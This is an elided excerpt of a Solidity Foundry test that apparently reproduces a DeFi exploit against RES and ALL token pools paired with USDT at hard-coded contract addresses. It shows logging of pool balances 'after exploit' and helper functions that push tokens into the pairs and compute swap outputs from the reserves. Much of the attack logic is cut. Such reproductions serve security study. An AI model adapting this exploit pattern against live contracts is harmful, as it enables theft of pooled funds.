...
contract ContractTest is Test {
    ...
    IUniswapV2Pair constant USDT_RES_PAIR =
        IUniswapV2Pair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
    IUniswapV2Pair constant USDT_ALL_PAIR =
        IUniswapV2Pair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
    ...
    function testExploit() public payable {
        ...
        emit log_named_decimal_uint(
            "[End] USDT_RES_PAIR USDT balance after exploit",
            USDT_TOKEN.balanceOf(address(USDT_RES_PAIR)),
            18
        );

        emit log_named_decimal_uint(
            "[End] USDT_ALL_PAIR USDT balance after exploit",
            USDT_TOKEN.balanceOf(address(USDT_ALL_PAIR)),
            18
        );
    ...
    function sellRES() internal {
        ...
        RES_TOKEN.transferFrom(
            ...
            RES_TOKEN.balanceOf(add)
        );
        uint256 amountin = RES_TOKEN.balanceOf(address(USDT_RES_PAIR)) -
            reserve1;
        uint256 amountout = (amountin * 9975 * reserve0) /
            (reserve1 * 10_000 + amountin * 9975);
    ...
    function sellALL() internal {
        ...
        ALL_TOKEN.transferFrom(
            ...
            ALL_TOKEN.balanceOf(add)
        );
        uint256 amountin = ALL_TOKEN.balanceOf(address(USDT_ALL_PAIR)) -
            reserve0;
        uint256 amountout = (amountin * 9975 * reserve1) /
            (reserve0 * 10_000 + amountin * 9975);
